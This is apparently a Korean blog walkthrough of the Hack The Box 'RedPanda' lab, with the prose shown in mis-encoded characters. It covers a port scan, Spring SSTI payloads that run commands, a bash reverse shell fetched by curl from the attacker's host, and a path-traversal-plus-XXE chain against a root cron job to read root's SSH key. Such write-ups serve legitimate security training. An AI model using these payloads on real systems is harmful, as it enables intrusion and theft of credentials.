---
title: "[Hack The Box] RedPanda í’€ì´"
categories:
  - Hack-The-Box
tags:
  - HTB
  - Hack The Box
  - RedPanda
toc: true
toc_sticky: true
toc_label: "RedPanda í’€ì´"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/hackthebox.jpeg
---

ğŸ’¡ Hack-The-Box RedPanda í’€ì´ ì…ë‹ˆë‹¤.
{: .notice--warning}

# ë¬¸ì œ

![image](https://user-images.githubusercontent.com/33647663/219956716-1474a230-4686-4e46-b50e-048cdd160ffa.png)


# Enumeration

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~kali/Desktop]
â””â”€# nmap -sV -p - -vv --min-rate 3000 10.129.87.207 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-19 10:10 EST
Discovered open port 8080/tcp on 10.129.87.207
Discovered open port 22/tcp on 10.129.87.207
Host is up, received echo-reply ttl 63 (0.32s latency).
Scanned at 2023-02-19 10:10:30 EST for 89s
Not shown: 65526 closed tcp ports (reset)
PORT      STATE    SERVICE    REASON         VERSION
22/tcp    open     ssh        syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp  open     http-proxy syn-ack ttl 63
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



# HTTP
![image](https://user-images.githubusercontent.com/33647663/219956836-55e52290-2d35-4b22-a332-68f7cd22f5d0.png)

![image](https://user-images.githubusercontent.com/33647663/219957033-635c26e3-4b39-404c-acc0-ee9b4735ad26.png)

ê²€ìƒ‰ ê¸°ëŠ¥ì„ ì´ìš©í•´ ë³´ë©´ ì‚¬ìš©ìì˜ ì…ë ¥ê°’ì´ ê·¸ëŒ€ë¡œ í™”ë©´ì— ë‹¤ì‹œ ë‚˜ì˜µë‹ˆë‹¤. ì´ëŸ¬í•œ ê¸°ëŠ¥ì˜ ê²½ìš° ```XSS```, ```SSTI``` ì·¨ì•½ì ì„ í™•ì¸í•´ ë´…ë‹ˆë‹¤.

```
*{3*3} 
```
ì„ ì…ë ¥í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ ì‹¤í–‰ëœ ê²°ê³¼ê°€ ë‚˜ì˜µë‹ˆë‹¤. 

![image](https://user-images.githubusercontent.com/33647663/219957117-3728d372-ddb8-49dd-b251-97cd03d3b9da.png)

```bash
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

![image](https://user-images.githubusercontent.com/33647663/219957181-de956336-68f3-4a1e-8db6-38c21d311ba9.png)

ì´ì œ SSTI ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ ì‰˜ì„ íšë“í•©ë‹ˆë‹¤.

ì¹¼ë¦¬ ë¦¬ëˆ…ìŠ¤ì—ì„œ ë¨¼ì € ë‹¤ìŒê³¼ ê°™ì´ ì¤€ë¹„ë¥¼ í•´ë‘¡ë‹ˆë‹¤.

```bash
echo "bash -i >& /dev/tcp/10.10.14.7/1234 0>&1" > revshell.sh
python -m http.server 80
nc -nlvp 1234
```

![image](https://user-images.githubusercontent.com/33647663/219957738-e225242f-0ece-4c20-a44f-3d9e14a774a1.png)


í˜ì´ë¡œë“œë¥¼ ì „ì†¡í•©ë‹ˆë‹¤.

```bash
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('curl http://10.10.14.7/revshell.sh -o /tmp/revshell.sh').getInputStream())}
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('chmod 777 /tmp/revshell.sh').getInputStream())}
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('bash /tmp/revshell.sh').getInputStream())}
```

![image](https://user-images.githubusercontent.com/33647663/219957809-f5148911-6283-45a1-8a47-de27e7cefa49.png)


# Privilege Escalation

## pspy64 & cron
pspy64ë¥¼ ì‹¤í–‰í•´ì„œ cronì´ ë™ì‘í•˜ëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/219958054-fc82e263-bfbb-43f6-b1e2-4b5eb5d92e6f.png)

root ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰ë˜ëŠ” cron ì‘ì—…ì´ ì¡´ì¬í•©ë‹ˆë‹¤.

í•´ë‹¹ ìë°” í”„ë¡œê·¸ë¨ì˜ êµ¬ì„±ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤. ì†ŒìŠ¤ì½”ë“œ íŒŒì¼ì¸ App.java íŒŒì¼ì„ ë¶„ì„í•©ë‹ˆë‹¤.

```bash
woodenk@redpanda:/opt/credit-score/LogParser/final$ ls -R
ls -R
.:
mvnw
pom.xml
pom.xml.bak
src
target

./src:
main
test

./src/main:
java

./src/main/java:
com

./src/main/java/com:
logparser

./src/main/java/com/logparser:
App.java

./src/test:
java

./src/test/java:
com

./src/test/java/com:
logparser

./src/test/java/com/logparser:
AppTest.java

./target:
archive-tmp
classes
final-1.0-jar-with-dependencies.jar
generated-sources
maven-status

./target/archive-tmp:

./target/classes:
com

./target/classes/com:
logparser

./target/classes/com/logparser:
App.class

./target/generated-sources:
annotations

./target/generated-sources/annotations:
```
```java
public class App {
    public static Map parseLog(String line) {
        String[] strings = line.split("\\|\\|");
        Map map = new HashMap<>();
        map.put("status_code", Integer.parseInt(strings[0]));
        map.put("ip", strings[1]);
        map.put("user_agent", strings[2]);
        map.put("uri", strings[3]);
        

        return map;
    }
    public static boolean isImage(String filename){
        if(filename.contains(".jpg"))
        {
            return true;
        }
        return false;
    }
    public static String getArtist(String uri) throws IOException, JpegProcessingException
    {
        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
        File jpgFile = new File(fullpath);
        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
        for(Directory dir : metadata.getDirectories())
        {
            for(Tag tag : dir.getTags())
            {
                if(tag.getTagName() == "Artist")
                {
                    return tag.getDescription();
                }
            }
        }

        return "N/A";
    }
    public static void addViewTo(String path, String uri) throws JDOMException, IOException
    {
        SAXBuilder saxBuilder = new SAXBuilder();
        XMLOutputter xmlOutput = new XMLOutputter();
        xmlOutput.setFormat(Format.getPrettyFormat());

        File fd = new File(path);
        
        Document doc = saxBuilder.build(fd);
        
        Element rootElement = doc.getRootElement();
 
        for(Element el: rootElement.getChildren())
        {
    
            
            if(el.getName() == "image")
            {
                if(el.getChild("uri").getText().equals(uri))
                {
                    Integer totalviews = Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1;
                    System.out.println("Total views:" + Integer.toString(totalviews));
                    rootElement.getChild("totalviews").setText(Integer.toString(totalviews));
                    Integer views = Integer.parseInt(el.getChild("views").getText());
                    el.getChild("views").setText(Integer.toString(views + 1));
                }
            }
        }
        BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
        xmlOutput.output(doc, writer);
    }
    public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
       // log íŒŒì¼ì„ ë¶ˆëŸ¬ì˜¨ë‹¤.
        File log_fd = new File("/opt/panda_search/redpanda.log");
        Scanner log_reader = new Scanner(log_fd);
        while(log_reader.hasNextLine())
        {
          // ë¡œê·¸íŒŒì¼ì„ í•œ ì¤„ì”© ë¶ˆëŸ¬ì˜¨ë‹¤.
            String line = log_reader.nextLine();
            if(!isImage(line))
            {   // ì´ë¯¸ì§€ì¸ì§€ í™•ì¸(.jpg ë¬¸ìì—´ ì¡´ì¬í•˜ëŠ”ì§€ í™•ì¸)
                continue;
            }
            // í•œ ì¤„ì”© íŒŒì‹±í•œë‹¤. 
            Map parsed_data = parseLog(line);
            // íŒŒì‹±ëœ ë°ì´í„°ì—ì„œ uri ì •ë³´ë¥¼ í†µí•´ì„œ getArtist í•¨ìˆ˜ í˜¸ì¶œ
            String artist = getArtist(parsed_data.get("uri").toString());
            // getArtist í•¨ìˆ˜ì˜ ê²°ê³¼ë¥¼ í†µí•´ì„œ xmlPath ì €ì¥
            String xmlPath = "/credits/" + artist + "_creds.xml";
            // xmlPathì™€ uri ì •ë³´ë¥¼ addviewTo í•¨ìˆ˜ë¡œ ì „ë‹¬
            addViewTo(xmlPath, parsed_data.get("uri").toString());
        }

    }
}


```

ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ì´ ë¡œê·¸íŒŒì¼ì„ íŒŒì‹±í•©ë‹ˆë‹¤.

1. /opt/panda_search/redpanda.log íŒŒì¼ì—ì„œ ë¡œê·¸ë¥¼ í•œ ì¤„ì”© ì½ì–´ë“¤ì¸ë‹¤.
2. í•´ë‹¹ í•œ ì¤„ì—ì„œ ```.jpg``` ë¬¸ìì—´ì´ ì¡´ì¬í•˜ëŠ”ì§€ í™•ì¸í•œë‹¤.
3. ```||```ë¥¼ ê¸°ì¤€ìœ¼ë¡œ ë¬¸ìì—´ë“¤ì„ ë¶„ë¦¬. ì´ ì¤‘, ì‚¬ìš©ë˜ëŠ” ë°ì´í„°ëŠ” 4ë²ˆì§¸ ë¸”ë¡ìœ¼ë¡œ ì´ ë°ì´í„°ê°€ ```uri```ì •ë³´ë¡œ ì‚¬ìš©.
4. "/opt/panda_search/src/main/resources/static" + uri ì˜ ê²½ë¡œì— ìˆëŠ” íŒŒì¼ì˜ exif ì •ë³´ë¥¼ ì½ì–´ì„œ artist ë°ì´í„° ë°˜í™˜  
   -> uri : ```/../../../../../../tmp/~~~``` ë¡œ ì›í•˜ëŠ” ê²½ë¡œì˜ íŒŒì¼ì„ ì½ì„ ìˆ˜ ìˆìŒ
5. ë°˜í™˜ëœ artist ì •ë³´ë¥¼ í† ëŒ€ë¡œ String xmlPath = "/credits/" + artist + "_creds.xml" ì™€ ê°™ì´ xmlPath ì§€ì •
   -> artist ì •ë³´ë¥¼ ```../tmp/aa``` ì™€ ê°™ì´ ì§€ì •í•˜ì—¬ ```/tmp/aa_creds.xml``` íŒŒì¼ì„ ê°€ë¦¬í‚¤ë„ë¡ í•  ìˆ˜ ìˆìŒ
6. artist_creds.xml íŒŒì¼ì„ íŒŒì‹±í•˜ì—¬ ì €ì¥ 
  -> ê¸°ì¡´ xml íŒŒì¼ì— ```xxe``` ì·¨ì•½ì ì„ ì´ìš©í•´ ì„ì˜ì˜ íŒŒì¼ì„ ì½ì„ ìˆ˜ ìˆìŒ

ìœ„ì˜ ì·¨ì•½ì ë“¤ì„ í™œìš©í•˜ì—¬ xxe ì·¨ì•½ì ìœ¼ë¡œ ëŒ€ìƒ ì„œë²„ì—ì„œ ì„ì˜ì˜ íŒŒì¼ì„ ì½ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. root ê¶Œí•œì„ ì–»ê¸° ìœ„í•´ì„œ ssh private key íŒŒì¼ì¸ ```/root/.ssh/id_rsa``` íŒŒì¼ì„ ì½ì–´ì˜µë‹ˆë‹¤.


## LFI & XXE


/tmp/lazy.jpg íŒŒì¼ì„ ë‹¤ìš´ë°›ê³  exiftoolì„ í™œìš©í•˜ì—¬ exif ì •ë³´ë¥¼ ë³€ì¡°í•©ë‹ˆë‹¤.


  ![image](https://user-images.githubusercontent.com/33647663/219960134-f5b3388e-272e-4e32-b4bf-e15122aa082d.png)

  ![image](https://user-images.githubusercontent.com/33647663/219960227-c4df22e2-02bc-4338-9303-4d27dd035690.png)

xxeë¥¼ ë°œìƒì‹œí‚¬ xml íŒŒì¼ì„ ì‘ì„±í•©ë‹ˆë‹¤. 
  
  ![image](https://user-images.githubusercontent.com/33647663/219960403-486a9eb8-0509-4e4b-9e3d-d97203aabf95.png)


ìœ„ì˜ íŒŒì¼ë“¤ì„ ê²½ë¡œë¥¼ ê³ ë ¤í•˜ì—¬ ëŒ€ìƒ ì„œë²„ì— ì—…ë¡œë“œ í•©ë‹ˆë‹¤.
 
  ![image](https://user-images.githubusercontent.com/33647663/219960710-6cdf1192-a9d1-4b2e-94c9-e1ad11e6a8ce.png)


ë¡œê·¸íŒŒì¼ì— ë‹¤ìŒê³¼ ê°™ì´ ì‘ì„±ë˜ë„ë¡ í•©ë‹ˆë‹¤.

  ```bash
  echo "1||2||3||/../../../../../../../../../tmp/lazy.jpg" > /opt/panda_search/redpanda.log
  ```

ì ì‹œ ê¸°ë‹¤ë¦° í›„ì—, xmlíŒŒì¼ì„ í™•ì¸í•©ë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/219961156-10767fb1-6ff9-49c3-a549-b1c17d7e2ed3.png)


## SSH
í‚¤ ë°ì´í„°ë¥¼ ì¹¼ë¦¬ ë¦¬ëˆ…ìŠ¤ì— ì €ì¥í•˜ê³  ë‹¤ìŒê³¼ ê°™ì´ ì ‘ì†í•˜ë©´ rootë¡œ ì ‘ì†ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/219961460-72c2ff55-e68c-49bd-b9ff-9e95158d1d2d.png)